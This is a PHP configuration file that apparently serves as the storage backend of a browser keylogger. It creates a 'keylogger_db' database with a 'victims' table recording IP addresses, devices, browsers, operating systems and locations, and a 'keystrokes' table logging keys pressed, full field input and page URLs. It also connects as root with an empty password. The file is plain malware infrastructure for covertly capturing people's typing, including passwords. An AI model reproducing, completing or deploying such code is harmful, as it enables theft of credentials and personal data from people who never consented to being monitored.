<?php
// config.php - Mobile friendly version
error_reporting(E_ALL);
ini_set('display_errors', 1);

$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'keylogger_db';

// Create connection
$conn = new mysqli($db_host, $db_user, $db_pass);

if ($conn->connect_error) {
    die(json_encode(['error' => 'Connection failed']));
}

// Create database
$conn->query("CREATE DATABASE IF NOT EXISTS $db_name");
$conn->select_db($db_name);

// Create victims table with better structure
$conn->query("CREATE TABLE IF NOT EXISTS victims (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(64) UNIQUE,
    ip_address VARCHAR(45),
    user_agent TEXT,
    device_type VARCHAR(50),
    browser VARCHAR(100),
    os VARCHAR(100),
    country VARCHAR(100),
    city VARCHAR(100),
    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_active DATETIME DEFAULT NULL,
    INDEX (session_id),
    INDEX (last_active)
)");

// Create keystrokes table
$conn->query("CREATE TABLE IF NOT EXISTS keystrokes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(64),
    app_name VARCHAR(100),
    field_name VARCHAR(200),
    key_pressed VARCHAR(50),
    full_input TEXT,
    page_url TEXT,
    element_type VARCHAR(50),
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX (session_id),
    INDEX (timestamp)
)");

return $conn;
?>